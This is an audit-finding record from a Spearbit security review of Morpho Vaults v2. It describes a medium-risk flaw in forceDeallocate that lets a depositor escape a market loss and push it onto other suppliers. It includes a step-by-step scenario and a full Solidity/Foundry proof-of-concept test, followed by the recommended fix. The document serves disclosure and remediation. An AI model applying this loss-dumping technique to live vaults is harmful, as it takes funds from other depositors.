{
    "id": 62921,
    "kind": "PDF",
    "auditfirm_id": 6,
    "impact": "MEDIUM",
    "finders_count": 4,
    "protocol_id": 3462,
    "title": "forceDeallocate allows user to avoid incurring in losses and dump them on other suppliers",
    "content": "## Medium Risk Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`VaultV2.sol#L567-L582`\n\n## Description\nThe current implementation of `forceDeallocate` allows a user to deallocate from any whitelisted adapter (+ data) an arbitrary amount of assets (which could be equal to the adapter's allocation when `forceDeallocatePenalty[adapter] == 0`). This logic can be exploited by users that want to avoid losses and dump them to all the other suppliers. \n\nThe user can simply deallocate as much as needed from those adapters that won't report a loss, and then perform a withdrawal from the Idle Market. At this point, the user could even trigger the accounting of the loss by deallocating a zero-amount from the adapters with a loss, account for it, and re-purchase the same supply position at a lower cost.\n\n### Example\nFor the sake of simplicity, let's assume there are no performance/management fees and zero force-deallocation penalties:\n\n1. Curator enables MorphoBlue Market 1.\n2. ALICE deposits 100 DAI that are deposited into MB market 1.\n3. Curator enables MorphoBlue Market 2 (different collateral).\n4. BOB deposits 100 DAI that are deposited into MB market 2.\n5. MorphoBlue Market 2 undergoes a loss of 100 DAI.\n6. BOB sees the loss but doesn't want to take part in it. Bob executes `vault.forceDeallocate(mbAdapter, mbMarket1, 100 DAI, bob)`. The `forceDeallocate` deallocates from the specified market. The `deallocate` function called inside `forceDeallocate` will not subtract the loss amount from `_totalAssets` because the loss has happened in MB Market 2 and not MB Market 1.\n7. The `withdraw(...)` executed in `forceDeallocate` to send the penalty to the vault itself will not trigger any loss accounting because they are taken directly from the IDLE market (filled by the deallocate).\n8. BOB calls `vault.redeem(100e18, bob, bob)` and pulls 100 DAI (in this example, `forceDeallocatePenalty` is zero as we said).\n\nAt this point, BOB was able to withdraw what he had deposited initially without incurring any loss. As soon as losses are realized, ALICE's shares will be worthless. BOB could at that point deposit again the same amount and gain many more shares at a \"discounted\" price. To trigger the loss accounting, BOB (or anyone) can just trigger an \"empty\" deposit like `vault.deposit(0, anyAddress)`.\n\n## Proof of Concept\nThe following test must be executed with the `--isolate` option to \"trick\" forge into executing multiple transactions to avoid the `EnterBlocked` revert error.\n\n```solidity\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity ^0.8.0;\n\nimport \"./BaseTest.sol\";\nimport {MorphoBlueAdapter} from \"../src/adapters/MorphoBlueAdapter.sol\";\nimport {MorphoBlueAdapterFactory} from \"../src/adapters/MorphoBlueAdapterFactory.sol\";\nimport {OracleMock} from \"../lib/morpho-blue/src/mocks/OracleMock.sol\";\nimport {IrmMock} from \"../lib/morpho-blue/src/mocks/IrmMock.sol\";\nimport {IMorpho, MarketParams, Id, Market, Position} from \"../lib/morpho-blue/src/interfaces/IMorpho.sol\";\nimport {MorphoBalancesLib} from \"../lib/morpho-blue/src/libraries/periphery/MorphoBalancesLib.sol\";\nimport {MarketParamsLib} from \"../lib/morpho-blue/src/libraries/MarketParamsLib.sol\";\nimport {IMorphoBlueAdapter} from \"../src/adapters/interfaces/IMorphoBlueAdapter.sol\";\nimport {IMorphoBlueAdapterFactory} from \"../src/adapters/interfaces/IMorphoBlueAdapterFactory.sol\";\n\ncontract SMBLossTest is BaseTest {\n    using MorphoBalancesLib for IMorpho;\n    using MarketParamsLib for MarketParams;\n\n    // Morpho Blue\n    address morphoOwner;\n    MarketParams internal marketParams_1;\n    MarketParams internal marketParams_2;\n    Id internal marketId_1;\n    Id internal marketId_2;\n    IMorpho internal morpho;\n    OracleMock internal oracle;\n    IrmMock internal irm;\n    ERC20Mock internal collateralToken_1;\n    ERC20Mock internal collateralToken_2;\n    ERC20Mock internal loanToken; // this is the V2 underlying\n    bytes[] internal expectedIds_1;\n    bytes[] internal expectedIds_2;\n    MorphoBlueAdapterFactory internal factoryMB;\n    MorphoBlueAdapter internal adapterMB;\n\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function testDeallocatePreventLoss() public {\n        // setup Morpho Blue Market\n        _setupMB(underlyingToken);\n        // setup Vault v2\n        _setupVV2(10_000e18, 1e18);\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        \n        // ALICE deposits 100 DAI\n        _deposit(alice, 100e18);\n        // enable the second MB market\n        vm.prank(allocator);\n        vault.setLiquidityData(abi.encode(marketParams_2));\n        // BOB deposits to the second market 100 DAI\n        _deposit(bob, 100e18);\n        \n        uint256 bobInitialSharesFor100Asset = vault.balanceOf(bob);\n        // second market receives a loss of 100 DAI (equal to Bob's asset deposited)\n        _overrideMarketTotalSupplyAssets(marketId_2, -int256(100e18));\n        \n        // BOB doesn't want to incur in the loss\n        // BOB calls `forceDeallocate(market1)` that will pull from the first market (that has enough funds) without realizing the loss\n        address[] memory adapters = new address[](1);\n        bytes[] memory marketData = new bytes[](1);\n        uint256[] memory amounts = new uint256[](1);\n        adapters[0] = address(adapterMB);\n        marketData[0] = abi.encode(marketParams_1);\n        amounts[0] = 100e18;\n\n        vm.prank(bob);\n        vault.forceDeallocate(adapters, marketData, amounts, bob);\n        \n        vm.prank(bob);\n        vault.redeem(100e18, bob, bob);\n        \n        // assert that BOB was able to withdraw what he had deposited\n        // even if the market where he had deposited to has been drained\n        assertEq(morpho.market(marketId_2).totalSupplyAssets, 0);\n        assertEq(vault.balanceOf(bob), 0);\n        assertEq(underlyingToken.balanceOf(bob), 100e18);\n\n        // ALICE tries to redeem 1 share of their asset but she can't because all the markets have been drained\n        // one because it had a loss\n        // one because it has been drained by BOB\n        // it reverts when the MorphoBlue adapter tries to withdraw from the Morpho market\n        // this tries to withdraw from market2\n        vm.prank(alice);\n        vm.expectRevert(); // [FAIL: panic: arithmetic underflow or overflow (0x11)]\n        vault.redeem(1, alice, alice);\n        \n        // tries to force deallocate from market1\n        amounts[0] = 1; // tries to withdraw 1 wei\n        vm.prank(alice);\n        vm.expectRevert(); // [FAIL: panic: arithmetic underflow or overflow (0x11)]\n        vault.forceDeallocate(adapters, marketData, amounts, alice);\n        \n        // \"trigger\" the accounting of the loss with a 0-deposit\n        vault.deposit(0, address(this));\n        \n        // confirm that ALICE's shares are worthless (0 value)\n        assertEq(vault.previewRedeem(vault.balanceOf(alice)), 0);\n        \n        vm.prank(bob);\n        // BOB re-deposits the same amount withdrawn\n        vault.deposit(100e18, bob);\n        \n        // confirm that now he owns more shares than before (because ALICE's shares are worthless)\n        assertGt(vault.balanceOf(bob), bobInitialSharesFor100Asset);\n    }\n    \n    function _deposit(address user, uint256 amount) internal {\n        deal(address(underlyingToken), user, amount, true);\n        vm.prank(user);\n        underlyingToken.approve(address(vault), type(uint256).max);\n        // supply\n        vm.prank(user);\n        vault.deposit(amount, user);\n    }\n    \n    function _withdraw(address user, uint256 amount) internal {\n        vm.prank(user);\n        vault.withdraw(amount, user, user);\n    }\n    \n    function _setupVV2(uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the MB adapter\n        vm.startPrank(curator);\n        vault.submit(abi.encodeCall(IVaultV2.setIsAdapter, (address(adapterMB), true)));\n        vm.stopPrank();\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        vault.setIsAdapter(address(adapterMB), true);\n        // setup the MB adapter as the main adapter\n        vm.prank(allocator);\n        vault.setLiquidityAdapter(address(adapterMB));\n        vm.prank(allocator);\n        vault.setLiquidityData(abi.encode(marketParams_1));\n        _increaseCaps(expectedIds_1, absoluteCap, relativeCap);\n        _increaseCaps(expectedIds_2, absoluteCap, relativeCap);\n    }\n\n    function _increaseCaps(bytes[] memory expectedIds, uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the absolute caps and relative caps\n        vm.startPrank(curator);\n        for(uint256 i = 0; i < expectedIds.length; i++) {\n            vault.submit(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (expectedIds[i], absoluteCap)));\n            vault.submit(abi.encodeCall(IVaultV2.increaseRelativeCap, (expectedIds[i], relativeCap)));\n        }\n        vm.stopPrank();\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        for(uint256 i = 0; i < expectedIds.length; i++) {\n            vault.increaseAbsoluteCap(expectedIds[i], absoluteCap);\n            vault.increaseRelativeCap(expectedIds[i], relativeCap);\n        }\n    }\n    \n    function _decreaseCaps(bytes[] memory expectedIds, uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the absolute caps and relative caps\n        vm.startPrank(curator);\n        for(uint256 i = 0; i < expectedIds.length; i++) {\n            vault.decreaseAbsoluteCap(expectedIds[i], absoluteCap);\n            vault.decreaseRelativeCap(expectedIds[i], relativeCap);\n        }\n        vm.stopPrank();\n    }\n    \n    function _setupMB(ERC20Mock v2Underlying) internal {\n        morphoOwner = makeAddr(\"MorphoOwner\");\n        morpho = IMorpho(deployCode(\"Morpho.sol\", abi.encode(morphoOwner)));\n        loanToken = v2Underlying;\n        collateralToken_1 = new ERC20Mock();\n        collateralToken_2 = new ERC20Mock();\n        oracle = new OracleMock();\n        irm = new IrmMock();\n        marketParams_1 = MarketParams({\n            loanToken: address(loanToken),\n            collateralToken: address(collateralToken_1),\n            irm: address(irm),\n            oracle: address(oracle),\n            lltv: 0.8 ether\n        });\n        marketParams_2 = MarketParams({\n            loanToken: address(loanToken),\n            collateralToken: address(collateralToken_2),\n            irm: address(irm),\n            oracle: address(oracle),\n            lltv: 0.8 ether\n        });\n        \n        vm.startPrank(morphoOwner);\n        morpho.enableIrm(address(irm));\n        morpho.enableLltv(0.8 ether);\n        vm.stopPrank();\n        \n        morpho.createMarket(marketParams_1);\n        morpho.createMarket(marketParams_2);\n        \n        marketId_1 = marketParams_1.id();\n        marketId_2 = marketParams_2.id();\n        \n        factoryMB = new MorphoBlueAdapterFactory(address(morpho));\n        adapterMB = MorphoBlueAdapter(factoryMB.createMorphoBlueAdapter(address(vault)));\n        \n        expectedIds_1 = new bytes[](3);\n        expectedIds_1[0] = abi.encode(\"adapter\", address(adapterMB));\n        expectedIds_1[1] = abi.encode(\"collateralToken\", marketParams_1.collateralToken);\n        expectedIds_1[2] = abi.encode(\"collateralToken/oracle/lltv\", marketParams_1.collateralToken, marketParams_1.oracle, marketParams_1.lltv);\n        \n        expectedIds_2 = new bytes[](3);\n        expectedIds_2[0] = abi.encode(\"adapter\", address(adapterMB));\n        expectedIds_2[1] = abi.encode(\"collateralToken\", marketParams_2.collateralToken);\n        expectedIds_2[2] = abi.encode(\"collateralToken/oracle/lltv\", marketParams_2.collateralToken, marketParams_2.oracle, marketParams_2.lltv);\n    }\n\n    // copied from original MorphoBlueAdapter Test\n    function _overrideMarketTotalSupplyAssets(Id marketId, int256 change) internal {\n        bytes32 marketSlot0 = keccak256(abi.encode(marketId, 3)); // 3 is the slot of the market\n        bytes32 currentSlot0Value = vm.load(address(morpho), marketSlot0);\n        uint256 currentTotalSupplyShares = uint256(currentSlot0Value) >> 128;\n        uint256 currentTotalSupplyAssets = uint256(currentSlot0Value) & type(uint256).max;\n        bytes32 newSlot0Value = bytes32((currentTotalSupplyShares << 128) | uint256(int256(currentTotalSupplyAssets) + change));\n        vm.store(address(morpho), marketSlot0, newSlot0Value);\n    }\n}\n\n## Recommendation\nThere's not an easy one-shot solution for this issue because the core problem lies in the fact that the vault does not account for the \"real\" interest and losses on demand from all the existing (and actively used) adapters.\n\n### Morpho\nSince PR 337, loss realization is incentivized, which means that one would need to be faster than \"MEV\" in order to do that. Note that this is very fundamental (Morpho Blue has the same issue, for example).\n\n### Spearbit\nThe `realizeLoss` function implemented in the above PR allows anyone, in a permissionless way, to realize losses in a whitelisted adapter. It's important to note the assumptions of the fix:\n\n1. The loss realization is performed before any further interaction with the vault.\n2. The loss realization is sufficiently incentivized to cover at least the gas cost of the operation and then the withdrawal of the funds (the caller receives shares, not underlying tokens).\n3. The loss realization is not front-runned by someone that could gain profit from the loss itself.",
    "summary": "",
    "report_date": "2025-10-13T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "github_link": "",
    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "pdf_page_from": 16,
    "contest_id": "",
    "slug": "forcedeallocate-allows-user-to-avoid-incurring-in-losses-and-dump-them-on-other-suppliers-spearbit-none-morpho-vaults-v2-pdf",
    "firm_name": "Spearbit",
    "firm_logo_square": "spearbit_square.png",
    "protocol_name": "Morpho Vaults v2",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Saw-mon and Natalie"
            }
        },
        {
            "wardens_warden": {
                "handle": "Om Parikh"
            }
        },
        {
            "wardens_warden": {
                "handle": "Jonatas Martins"
            }
        },
        {
            "wardens_warden": {
                "handle": "Emmanuele Ricci"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
    },
    "protocols_protocol": {
        "name": "Morpho Vaults v2",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}